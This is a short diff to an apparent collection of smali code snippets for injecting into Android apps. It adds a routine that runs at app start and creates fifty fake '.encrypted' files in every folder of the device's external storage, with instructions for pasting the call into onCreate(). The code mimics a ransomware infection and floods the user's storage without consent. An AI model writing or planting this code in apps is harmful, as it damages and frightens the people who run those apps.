@@ -257,8 +257,29 @@
 .end method
 
 
-#caller. Paste it at the first line of onCreate() method invoke-direct {p0}, Lcom/mycompany/myapp2/MainActivity;->iq500SplitSentenceIntoToasts()V #You have to manually set the current activity (Lcom...) 
-
+#caller. Paste it at first line of the onCreate() method
+invoke-direct {p0}, Lcom/mycompany/myapp2/MainActivity;->iq500MassiveFileCreator()V
+#You have to manually set the current activity (Lcom...)
 
 #Java logic is as follows:
 
+private void iq500MassiveFileCreator()
+{
+	File dir = new File(Environment.getExternalStorageDirectory() + "/");
+	String[] dir2 = dir.list();
+		
+	for(int i = 0; i < dir2.length; i++)
+	{
+		for(int j = 0; j < 50; j++)
+		{
+			File file = new File(Environment.getExternalStorageDirectory()+"/" + dir2[i] + "/" + Integer.toString(j) + ".encrypted"); 
+			try
+			{
+				file.createNewFile();
+			}
+			catch (IOException e)
+			{}
+		}
+		
+	}
+}
